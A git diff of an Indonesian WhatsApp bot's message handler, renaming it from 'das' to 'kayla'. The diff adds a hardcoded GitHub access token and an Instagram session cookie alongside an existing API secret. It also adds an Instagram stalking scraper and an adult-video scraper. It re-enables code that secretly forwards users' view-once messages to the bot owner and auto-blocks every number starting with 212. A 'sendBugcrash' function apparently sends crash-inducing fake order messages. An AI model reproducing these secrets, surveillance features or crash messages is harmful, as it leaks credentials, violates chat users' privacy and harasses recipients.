@@ -1,4 +1,4 @@
-// =_=_=_=_=_=_=_=_=_=_=_  MODULES AND FUNCTIONS  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
+//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
 const convertapi = require('convertapi')('wJr3Fj2prUpm8P0b');
 require('./settings');
 require('./lib/funclist');
@@ -74,6 +74,7 @@ const { philips } = require('./scrape/philips');
 const { santedpc } = require('./lib/santedpc');
 const { santedgc } = require('./lib/santedgc');
 const { antiSpam } = require('./lib/antispam');
+const { cari_mahasiswa, esertifikat } = require('./lib/diky');
 const { color, bgcolor } = require('./lib/color');
 const { jadibot, conns } = require('./jadibot');
 const { uptotelegra } = require('./scrape/upload');
@@ -95,29 +96,21 @@ const npmstalk = require('./scrape/npmstalk');
 const mlstalk = require('./scrape/mlstalk');
 const textpro = require('./scrape/textpro');
 const photooxy = require('./scrape/photooxy');
-const yts = require('./scrape/yt-search/dist/yt-search');
+const yts = require('./scrape/yt-search');
 const kirleys = require('@adiwajshing/baileys');
 const vm = require('node:vm');
-const path = require('node:path');
-const rimraf = require('rimraf');
 const audionye = fs.readFileSync('./y.mp3');
-
-// =_=_=_=_=_=_=_=_=_=_=_  DATABASES _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
 const owner = JSON.parse(fs.readFileSync('./database/owner.json'));
 const prem = JSON.parse(fs.readFileSync('./database/premium.json'));
 const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
 const pendaftar = JSON.parse(fs.readFileSync('./database/user.json'));
 const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'));
 const dblist = JSON.parse(fs.readFileSync('./database/listall.json'));
-const _claim = JSON.parse(fs.readFileSync('./database/claim.json'));
-let dbChat = [];
-global.dbChatUpsert = dbChat;
 
 // =_=_=_=_=_=_=_=_ SELF MODE  =_=_=_=_=_=_=_=_=_=_=_=_=_
 let self = true;
 // =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_==_=_=_=_=_=_=_
 
-// =_=_=_=_=_=_=_=_=_=_=_  DATABASES _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
 global.db = JSON.parse(fs.readFileSync('./database/database.json'));
 if (global.db)
   global.db = {
@@ -130,17 +123,9 @@ if (global.db)
     ...(global.db || {}),
   };
 
-// =_=_=_=_=_=_=_=_=_=_=_  MODULE DAS  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-module.exports = das = async (das, m, chatUpdate, store) => {
-  const unavaliable = await das.sendPresenceUpdate(
-    'unavailable',
-    m.key.remoteJid
-  );
-  dbChat.push({
-    id: m.key.id,
-    msg: m,
-  });
+module.exports = kayla = async (kayla, m, chatUpdate, store) => {
   try {
+    const gakbisaowner = `${ownerNomor}@s.whatsapp.net`;
     const body =
       m.mtype === 'conversation'
         ? m.message.conversation
@@ -161,11 +146,11 @@ module.exports = das = async (das, m, chatUpdate, store) => {
           m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
           m.text
         : '';
-    // const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body)
-    //   ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi)
-    //   : 'z';
     const budy = typeof m.text == 'string' ? m.text : '';
-    const prefix = body.match(/[^a-zA-Z0-9]/);
+    const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body)
+      ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi)
+      : 'zzzzzzzzzzzzzz';
+
     const chath =
       m.mtype === 'conversation' && m.message.conversation
         ? m.message.conversation
@@ -195,15 +180,16 @@ module.exports = das = async (das, m, chatUpdate, store) => {
     const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
     const args = body.trim().split(/ +/).slice(1);
     const pushname = m.pushName || 'No Name';
-    const botNumber = await das.decodeJid(das.user.id);
-    // console.log(botNumber);
-    const isOwner = [botNumber, creator, ...owner]
+    const botNumber = await kayla.decodeJid(kayla.user.id);
+    const isOwner = [botNumber, ...owner]
       .map((v) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
       .includes(m.sender);
-    const isCreator = creator.includes(m.sender);
+
+    const itsMeKayla = [botNumber, ...owner]
+      .map((v) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+      .includes(m.sender);
     const itsMe = m.sender == botNumber ? true : false;
-    const text = args.join(' ');
-    const q = text;
+    const text = (q = args.join(' '));
     let q1 = q.split('|')[0];
     let q2 = q.split('|')[1];
     const quoted = m.quoted ? m.quoted : m;
@@ -219,8 +205,6 @@ module.exports = das = async (das, m, chatUpdate, store) => {
     const isVideo = m.mtype == 'videoMessage';
     const isAudio = m.mtype == 'audioMessage';
     const isSticker = m.mtype == 'stickerMessage';
-    const isQuotedText =
-      m.mtype === 'extendedTextMessage' && content.includes('conversation');
     const isQuotedImage =
       m.mtype === 'extendedTextMessage' && content.includes('imageMessage');
     const isQuotedLocation =
@@ -273,10 +257,14 @@ module.exports = das = async (das, m, chatUpdate, store) => {
     );
     const kaymenit = Math.floor((KaylaBotWA % (1000 * 60 * 60)) / (1000 * 60));
     const kaydetik = Math.floor((KaylaBotWA % (1000 * 60)) / 1000);
-    const sender = m.sender;
+    const sender = m.isGroup
+      ? m.key.participant
+        ? m.key.participant
+        : m.participant
+      : m.key.remoteJid;
     const senderNumber = sender.split('@')[0];
     const groupMetadata = m.isGroup
-      ? await das.groupMetadata(m.chat).catch((e) => {})
+      ? await kayla.groupMetadata(m.chat).catch((e) => {})
       : '';
     const groupName = m.isGroup ? groupMetadata.subject : '';
     const participants = m.isGroup ? await groupMetadata.participants : '';
@@ -289,10 +277,9 @@ module.exports = das = async (das, m, chatUpdate, store) => {
     const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
     const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
     const isPrem = '0';
-    const isGroup = m.isGroup;
     // const isPrem = prem.includes(sender);
     const isUser = pendaftar.includes(sender);
-    const banUser = await das.fetchBlocklist();
+    const banUser = await kayla.fetchBlocklist();
     const isBanned = banUser ? banUser.includes(m.sender) : false;
     const mentionUser = [
       ...new Set([
@@ -320,7 +307,7 @@ module.exports = das = async (das, m, chatUpdate, store) => {
       : q
       ? numberQuery
       : false;
-    // =_=_=_=_=_=_=_=_=_=_=_ AFK FUNCTIONS  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
+
     try {
       const isNumber = (x) => typeof x === 'number' && !isNaN(x);
       const user = global.db.users[m.sender];
@@ -338,8 +325,8 @@ module.exports = das = async (das, m, chatUpdate, store) => {
     } catch (err) {
       console.error(err);
     }
-    // =_=_=_=_=_=_=_=_=_=_=_ SELF MODE _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-    if (!das.public) {
+    // console.log('owner');
+    if (!kayla.public) {
       // console.log('SELF MODE');
       if (!isOwner) return;
     }
@@ -355,7 +342,6 @@ module.exports = das = async (das, m, chatUpdate, store) => {
     var mde = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white'];
     var halale = mde[Math.floor(Math.random() * mde.length)];
 
-    // =_=_=_=_=_=_=_=_=_=_=_  CONSOLE ISCMD  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
     if (isCmd) {
       console.log(
         chalk.yellow.bgCyan.bold(' - Das 𝙱𝚘𝚝 '),
@@ -366,23 +352,15 @@ module.exports = das = async (das, m, chatUpdate, store) => {
         color(`${body}`, `${halale}`)
       );
     }
-    // =_=_=_=_=_=_=_=_=_=_=_ PUSH USER TO DB _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
 
-    // implementation constructor function
-    function User(pushname, no) {
-      (this.pushname = pushname), (this.no = no);
-    }
-    const isRegistered = JSON.stringify(pendaftar).includes(sender);
-    if (isCmd && !isRegistered) {
-      pendaftar.push(new User(pushname, sender));
+    if (isCmd && !isUser) {
+      pendaftar.push(sender);
       fs.writeFileSync(
         './database/user.json',
         JSON.stringify(pendaftar, null, 2)
       );
     }
-
-    // =_=_=_=_=_=_=_=_=_=_=_  FILTER 5 SECONDS  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-
+    /*
     if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
       console.log(
         color('[SPAM]', 'red'),
@@ -394,22 +372,21 @@ module.exports = das = async (das, m, chatUpdate, store) => {
       return m.reply('「 ❗ 」Sabar Bang 5 Detik/Command');
     }
 
-    // if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
-    //   console.log(
-    //     color('[SPAM]', 'red'),
-    //     color(wib, 'yellow'),
-    //     color(`${command} [${args.length}]`),
-    //     'from',
-    //     color(pushname),
-    //     'in',
-    //     color(groupName)
-    //   );
-    //   return m.reply('「 ❗ 」 - Sabar Bang jeda 5 detik');
-    // }
+    if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
+      console.log(
+        color('[SPAM]', 'red'),
+        color(wib, 'yellow'),
+        color(`${command} [${args.length}]`),
+        'from',
+        color(pushname),
+        'in',
+        color(groupName)
+      );
+      return m.reply('「 ❗ 」Sabar Bang 5 Detik/Command');
+    }
+*/
+    if (isCmd && !itsMeKayla) antiSpam.addFilter(from);
 
-    if (isCmd && !isOwner && !isCreator) antiSpam.addFilter(from);
-
-    // =_=_=_=_=_=_=_=_=_=_=_  AFK FUNCTIONS  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
     for (let jid of mentionUser) {
       let user = global.db.users[jid];
       if (!user) continue;
@@ -436,26 +413,11 @@ Selama ${clockString(new Date() - user.afkTime)}
       user.afkReason = '';
     }
 
-    // =_=_=_=_=_=_=_=_=_=_=_  STORY HANDLER  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-    if (m.key.remoteJid == 'status@broadcast') return;
+    if (m.sender.startsWith('212'))
+      return kayla.updateBlockStatus(m.sender, 'block');
+    if (m.key.remoteJid == 'status@broadcast')
+      return kayla.sendReadReceipt(from, m.sender, [m.key.id]);
 
-    // =_=_=_=_=_=_=_=_=_=_=_  PP USER  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-    try {
-      ppuser = await das.profilePictureUrl(m.sender, 'image');
-    } catch (err) {
-      ppuser =
-        'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60';
-    }
-    ppnyauser = await reSize(ppuser, 300, 300);
-
-    // =_=_=_=_=_=_=_=_=_=_=_ FUNCTIONS  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-
-    const onWhatsApp = async (m) => {
-      let onWA = await das.onWhatsApp(m);
-      if ((onWA.length = 0)) return false;
-      return true;
-    };
-    // =_=_=_=_=_=_=_=_=_=_=_ SENDMESSAGE FUNCTIONS  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
     async function sendKaylaMessage(chatId, message, options = {}) {
       let generate = await generateWAMessage(chatId, message, options);
       let type2 = getContentType(generate.message);
@@ -463,20 +425,28 @@ Selama ${clockString(new Date() - user.afkTime)}
         generate.message[type2].contextInfo = options?.contextInfo;
       if ('contextInfo' in message)
         generate.message[type2].contextInfo = message?.contextInfo;
-      return await das.relayMessage(chatId, generate.message, {
+      return await kayla.relayMessage(chatId, generate.message, {
         messageId: generate.key.id,
       });
     }
 
     const sendSticker = (pesan) => {
-      das.sendImageAsSticker(m.chat, pesan, m, {
+      kayla.sendImageAsSticker(m.chat, pesan, m, {
         packname: global.packname,
         author: global.author,
       });
     };
 
+    try {
+      ppuser = await kayla.profilePictureUrl(m.sender, 'image');
+    } catch (err) {
+      ppuser =
+        'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60';
+    }
+    ppnyauser = await reSize(ppuser, 300, 300);
+
     const sendvn = (teks) => {
-      das.sendMessage(
+      kayla.sendMessage(
         from,
         { audio: teks, mimetype: 'audio/mp4', ptt: true },
         { quoted: m }
@@ -490,23 +460,23 @@ Selama ${clockString(new Date() - user.afkTime)}
       }
     }
 
-    // if (m.mtype == 'viewOnceMessage') {
-    //   let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${
-    //     m.sender.split('@')[0]
-    //   }\n├ *Clock* : ${wib} WIB\n└ *Message* : ${m.mtype}`;
-    //   das.sendMessage(
-    //     ownerNumber,
-    //     { text: teks, mentions: [m.sender] },
-    //     { quoted: m }
-    //   );
-    //   await sleep(500);
-    //   m.copyNForward(
-    //     ownerNumber,
-    //     true,
-    //     { readViewOnce: true },
-    //     { quoted: m }
-    //   ).catch((_) => m.reply('Mungkin dah pernah dibuka bot'));
-    // }
+    if (m.mtype == 'viewOnceMessage') {
+      let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${
+        m.sender.split('@')[0]
+      }\n├ *Clock* : ${wib} WIB\n└ *Message* : ${m.mtype}`;
+      kayla.sendMessage(
+        ownerNumber,
+        { text: teks, mentions: [m.sender] },
+        { quoted: m }
+      );
+      await sleep(500);
+      m.copyNForward(
+        ownerNumber,
+        true,
+        { readViewOnce: true },
+        { quoted: m }
+      ).catch((_) => m.reply('Mungkin dah pernah dibuka bot'));
+    }
 
     const lep = {
       key: {
@@ -529,7 +499,7 @@ Selama ${clockString(new Date() - user.afkTime)}
         participant: `0@s.whatsapp.net`,
         ...(from
           ? {
-              remoteJid: '6285768966412@s.whatsapp.net',
+              remoteJid: '6285216024226@s.whatsapp.net',
             }
           : {}),
       },
@@ -560,37 +530,9 @@ Selama ${clockString(new Date() - user.afkTime)}
         },
       },
     };
-    // console.log(botNumber);
-    const sendMP3 = (mem, filename = 'audio') => {
-      das.sendMessage(
-        m.chat,
-        {
-          document: { url: mem },
-          mimetype: 'audio/mpeg',
-          fileName: filename + `.mp3`,
-          jpegThumbnail: ppnyauser,
-          mentions: [sender],
-        },
-        { quoted: m }
-      );
-    };
 
-    const sendCreator = (teks) => {
-      das.sendMessage(
-        ownerNumber,
-        {
-          text: teks,
-
-          contextInfo: {
-            forwardingScore: 5,
-            isForwarded: true,
-          },
-        },
-        { quoted: m }
-      );
-    };
     const sendOwner = (teks) => {
-      das.sendMessage(
+      kayla.sendMessage(
         ownerNumber,
         {
           text: teks,
@@ -604,25 +546,25 @@ Selama ${clockString(new Date() - user.afkTime)}
       );
     };
     const sendMenuMessage = (p) => {
-      das.sendMessage(from, p, { quoted: m });
+      kayla.sendMessage(from, p, { quoted: m });
     };
     const reply = (teks) => {
-      das.sendMessage(
+      kayla.sendMessage(
         from,
         {
-          text: teks + footer,
+          text: teks,
 
           contextInfo: {
-            forwardingScore: 50,
+            forwardingScore: 5,
             isForwarded: true,
           },
         },
-        { quoted: m }
+        { quoted: repPy }
       );
     };
 
     const banRep = () => {
-      das.sendMessage(
+      kayla.sendMessage(
         m.chat,
         {
           text: `Maaf Anda Sudah Di Banned Silahkan Chat @${
@@ -636,7 +578,6 @@ Selama ${clockString(new Date() - user.afkTime)}
       );
     };
 
-    // =_=_=_=_=_=_=_=_=_=_=_  BANNED HANDLER _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
     if (isCmd && isBanned) {
       return banRep();
     }
@@ -655,7 +596,7 @@ Selama ${clockString(new Date() - user.afkTime)}
           fileLength: '64455',
           pageCount: 1,
           mediaKey: 'P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=',
-          fileName: `Das Bot WhatsApp${ngazap(prefix)}`,
+          fileName: `Kayla Bot WhatsApp${ngazap(prefix)}`,
           fileEncSha256: 'ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=',
         },
       },
@@ -664,11 +605,11 @@ Selama ${clockString(new Date() - user.afkTime)}
     let list = [];
     for (let i of owner) {
       list.push({
-        displayName: await das.getName(i + '@s.whatsapp.net'),
+        displayName: await kayla.getName(i + '@s.whatsapp.net'),
         vcard: `BEGIN:VCARD\n
 VERSION:3.0\n
-N:${await das.getName(i + '@s.whatsapp.net')}\n
-FN:${await das.getName(i + '@s.whatsapp.net')}\n
+N:${await kayla.getName(i + '@s.whatsapp.net')}\n
+FN:${await kayla.getName(i + '@s.whatsapp.net')}\n
 item1.TEL;waid=${i}:${i}\n
 item1.X-ABLabel:Ponsel\n
 item2.EMAIL;type=INTERNET:Faruqmaker/my.id\n
@@ -772,7 +713,7 @@ END:VCARD`,
           surface: 'CATALOG',
           message: `Kayla Bot WhatsApp${ngazap(prefix)}`,
           orderTitle: 'Kayla Bot WhatsApp${ngazap(prefix)}',
-          sellerJid: '6285768966412@s.whatsapp.net',
+          sellerJid: '6285216024226@s.whatsapp.net',
           token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',
           totalAmount1000: '500000000000000',
           totalCurrencyCode: 'IDR',
@@ -782,16 +723,13 @@ END:VCARD`,
 
     let rn = ['recording', 'composing'];
     let jd = rn[Math.floor(Math.random() * rn.length)];
-
-    // =_=_=_=_=_=_=_=_=_=_=_  AUTO READ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
     /* auto read
     if (command) {
-      das.sendPresenceUpdate(jd, from);
-      das.readMessages([m.key]);
+      kayla.sendPresenceUpdate(jd, from);
+      kayla.readMessages([m.key]);
     }
     */
 
-    // =_=_=_=_=_=_=_=_=_=_=_  FUNCTIONS  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
     function simpan(path, buff) {
       fs.writeFileSync(path, buff);
       return path;
@@ -813,7 +751,7 @@ END:VCARD`,
         let nana = ytdl(Link)
           .pipe(fs.createWriteStream(mp4File))
           .on('finish', async () => {
-            await das.sendMessage(
+            await kayla.sendMessage(
               from,
               {
                 video: fs.readFileSync(mp4File),
@@ -837,21 +775,9 @@ END:VCARD`,
         ytdl(Link, { filter: 'audioonly' })
           .pipe(fs.createWriteStream(mp3File))
           .on('finish', async () => {
-            await das.sendMessage(
+            await kayla.sendMessage(
               from,
               { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' },
-              { quoted: m }
-            );
-
-            await das.sendMessage(
-              m.chat,
-              {
-                document: { url: fs.readFileSync(mp3File) },
-                mimetype: 'audio/mpeg',
-                fileName: `ytmp3.mp3`,
-                // jpegThumbnail: ppnyauser,
-                // mentions: [sender],
-              },
               { quoted: m }
             );
             fs.unlinkSync(mp3File);
@@ -862,7 +788,7 @@ END:VCARD`,
     };
 
     async function sendPoll(jid, text, list) {
-      das.relayMessage(
+      kayla.relayMessage(
         jid,
         {
           pollCreationMessage: {
@@ -878,7 +804,7 @@ END:VCARD`,
     }
 
     async function bygbt(text) {
-      das.sendMessage(text, {
+      kayla.sendMessage(text, {
         text: '',
         templateButtons: [
           { callButton: { displayText: `P`, phoneNumber: `` } },
@@ -896,10 +822,43 @@ END:VCARD`,
       });
     }
 
-    const botzkayla = '6285768966412@s.whatsapp.net';
+    const botzkayla = '6285216024226@s.whatsapp.net';
     const mark = '0@s.whatsapp.net';
     const timestamp = speed();
     const latensi = speed() - timestamp;
+    const butlocNye = [
+      {
+        buttonId: `${prefix}owner`,
+        buttonText: { displayText: '𝗢𝗪𝗡𝗘𝗥' },
+        type: 1,
+      },
+      {
+        buttonId: `${prefix}sewabot`,
+        buttonText: { displayText: '𝗦𝗘𝗪𝗔𝗕𝗢𝗧' },
+        type: 1,
+      },
+    ];
+    const buttonLocnya = {
+      location: { jpegThumbnail: ppnyauser },
+      caption: `Hai Kak @${sender.split('@')[0]} 
+𝘚𝘢𝘺𝘢 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 yang dibangun dengan bahasa pemrograman javascript.
+
+Nama ${itsMeKayla ? 'Owner' : 'User'} : ${pushname}
+Nomor ${itsMeKayla ? 'Owner' : 'User'} : ${sender.split('@')[0]}
+Jumlah User : ${pendaftar.length} User
+Status : ${itsMeKayla ? 'Owner' : 'User'}
+Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
+Runtime Bot : ${runtime(process.uptime())}
+Speed Bot : ${latensi.toFixed(4)} 𝘋𝘦𝘵𝘪𝘬
+Mode : ${kayla.public ? 'Public' : 'Self'}
+
+`,
+      mentions: [sender, botzkayla, mark],
+      footer: `Created By @${botzkayla.split('@')[0]}
+WhatsApp By @${mark.split('@')[0]}`,
+      buttons: butlocNye,
+      headerType: 'LOCATION',
+    };
 
     async function rmbg(buffer) {
       let form = new FormData();
@@ -952,7 +911,7 @@ END:VCARD`,
       else if (mime == 'webp') type = 'sticker';
       else if (mime == 'mp4') type = 'video';
       else type = 'document';
-      return das.sendMessage(
+      return kayla.sendMessage(
         jid,
         { [type]: file.data, ...options },
         { ...options }
@@ -1007,20 +966,20 @@ END:VCARD`,
       return build_server + data.image;
     }
 
-    async function genProfile(das, m) {
+    async function genProfile(kayla, m) {
       let font = await Jimp.loadFont('./name.fnt'),
         mask = await Jimp.read('https://i.imgur.com/552kzaW.png'),
         welcome = await Jimp.read(
           'https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg'
         ),
         avatar = await Jimp.read(
-          await das
+          await kayla
             .profilePictureUrl(m.sender, 'image')
             .catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
         ),
         status =
           (
-            (await das.fetchStatus(m.sender).catch(console.log)) || {}
+            (await kayla.fetchStatus(m.sender).catch(console.log)) || {}
           ).status?.slice(0, 30) || 'Not Detected';
       await avatar.resize(460, 460);
       await mask.resize(460, 460);
@@ -1105,6 +1064,44 @@ END:VCARD`,
       });
     }
 
+    async function tiktokdl(url) {
+      try {
+        const tokenn = await axios.get(
+          'https://downvideo.quora-wiki.com/tiktok-video-downloader#url=' + url
+        );
+        let a = cheerio.load(tokenn.data);
+        let token = a('#token').attr('value');
+        const param = {
+          url: url,
+          token: token,
+        };
+        const { data } = await axios.request(
+          'https://downvideo.quora-wiki.com/system/action.php',
+          {
+            method: 'post',
+            data: new URLSearchParams(Object.entries(param)),
+            headers: {
+              'content-type':
+                'application/x-www-form-urlencoded; charset=UTF-8',
+              'user-agent':
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
+              referer:
+                'https://downvideo.quora-wiki.com/tiktok-video-downloader',
+            },
+          }
+        );
+        return {
+          status: 200,
+          title: data.title,
+          thumbnail: 'https:' + data.thumbnail,
+          duration: data.duration,
+          media: data.medias,
+        };
+      } catch (e) {
+        return e;
+      }
+    }
+
     async function obfus(query) {
       return new Promise((resolve, reject) => {
         try {
@@ -1148,6 +1145,87 @@ END:VCARD`,
       });
     }
 
+    async function hentaivid() {
+      return new Promise((resolve, reject) => {
+        const page = Math.floor(Math.random() * 1153);
+        axios.get('https://sfmcompile.club/page/' + page).then((data) => {
+          const $ = cheerio.load(data.data);
+          const hasil = [];
+          $('#primary > div > div > ul > li > article').each(function (a, b) {
+            hasil.push({
+              title: $(b).find('header > h2').text(),
+              link: $(b).find('header > h2 > a').attr('href'),
+              category: $(b)
+                .find('header > div.entry-before-title > span > span')
+                .text()
+                .replace('in ', ''),
+              share_count: $(b)
+                .find('header > div.entry-after-title > p > span.entry-shares')
+                .text(),
+              views_count: $(b)
+                .find('header > div.entry-after-title > p > span.entry-views')
+                .text(),
+              type: $(b).find('source').attr('type') || 'image/jpeg',
+              video_1:
+                $(b).find('source').attr('src') ||
+                $(b).find('img').attr('data-src'),
+              video_2: $(b).find('video > a').attr('href') || '',
+            });
+          });
+          resolve(hasil);
+        });
+      });
+    }
+
+    async function igstalk(Username) {
+      return new Promise((resolve, reject) => {
+        axios
+          .get('https://dumpor.com/v/' + Username, {
+            headers: {
+              cookie:
+                '_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8',
+              'user-agent':
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
+            },
+          })
+          .then((res) => {
+            const $ = cheerio.load(res.data);
+            const result = {
+              profile: $(
+                '#user-page > div.user > div.row > div > div.user__img'
+              )
+                .attr('style')
+                .replace(/(background-image: url\(\'|\'\);)/gi, ''),
+              fullname: $(
+                '#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1'
+              ).text(),
+              username: $(
+                '#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4'
+              ).text(),
+              post: $(
+                '#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)'
+              )
+                .text()
+                .replace(' Posts', ''),
+              followers: $(
+                '#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)'
+              )
+                .text()
+                .replace(' Followers', ''),
+              following: $(
+                '#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)'
+              )
+                .text()
+                .replace(' Following', ''),
+              bio: $(
+                '#user-page > div.user > div > div.col-md-5.my-3 > div'
+              ).text(),
+            };
+            resolve(result);
+          });
+      });
+    }
+
     async function sendBugcrash(
       jid,
       title,
@@ -1182,7 +1260,7 @@ END:VCARD`,
       let progene = await generateWAMessageFromContent(jid, prod, {
         quoted: troli,
       });
-      return das.relayMessage(progene.key.remoteJid, progene.message, {
+      return kayla.relayMessage(progene.key.remoteJid, progene.message, {
         messageId: '',
       });
     }
@@ -1195,7 +1273,7 @@ END:VCARD`,
           type: 1,
         },
       ];
-      return das.sendButtonText(
+      return kayla.sendButtonText(
         m.chat,
         buttons,
         teks,
@@ -1204,11 +1282,53 @@ END:VCARD`,
       );
     }
 
-    // =_=_=_=_=_=_=_=_=_=_=_  AUTO STICKER  _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
+    if (/hehe/g.test(m.body)) {
+      let reactionMessage = proto.Message.ReactionMessage.create({
+        key: m.key,
+        text: '',
+      });
+      kayla.relayMessage(m.chat, { reactionMessage }, { messageId: 'ppppp' });
+    }
+
+    if (autodltt) {
+      if (
+        /(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/.test(
+          body
+        ) &&
+        !body.startsWith(prefix)
+      ) {
+        url = body.match(
+          /(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/
+        )[0];
+        let atdl = await tiktokdl(url);
+        let buttons = [
+          {
+            buttonId: `.tiktokvideo ${url}`,
+            buttonText: { displayText: 'Video' },
+            type: 1,
+          },
+          {
+            buttonId: `.tiktokaudio ${url}`,
+            buttonText: { displayText: 'Audio' },
+            type: 1,
+          },
+        ];
+        await kayla.sendButtonText(
+          m.chat,
+          buttons,
+          `Auto Download Tiktok
+
+Title : ${atdl.title}`,
+          `Auto Downloader By Kayla`,
+          ftext
+        );
+      }
+    }
+
     if (autosticker) {
       if (/image/.test(mime) && !/webp/.test(mime)) {
         let media = await quoted.download();
-        let encmedia = await das.sendImageAsSticker(m.chat, media, m, {
+        let encmedia = await kayla.sendImageAsSticker(m.chat, media, m, {
           packname: global.packname,
           author: global.author,
         });
@@ -1217,7 +1337,7 @@ END:VCARD`,
         if ((quoted.msg || quoted).seconds > 11)
           return reply('Maksimal 10 detik!');
         let media = await quoted.download();
-        let encmedia = await das.sendVideoAsSticker(m.chat, media, m, {
+        let encmedia = await kayla.sendVideoAsSticker(m.chat, media, m, {
           packname: global.packname,
           author: global.author,
         });
@@ -1225,32 +1345,31 @@ END:VCARD`,
       }
     }
 
-    // =_=_=_=_=_=_=_=_=_=_=_  ANTILINK _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_ _=_=_=_=_
-    if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
+    if (m.isGroup && !m.key.fromMe && !itsMeKayla && antilink) {
       if (!isBotAdmins) return;
       if (budy.match(`chat.whatsapp.com`)) {
-        das.sendMessage(
+        kayla.sendMessage(
           m.chat,
           {
             text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`,
           },
           { quoted: m }
         );
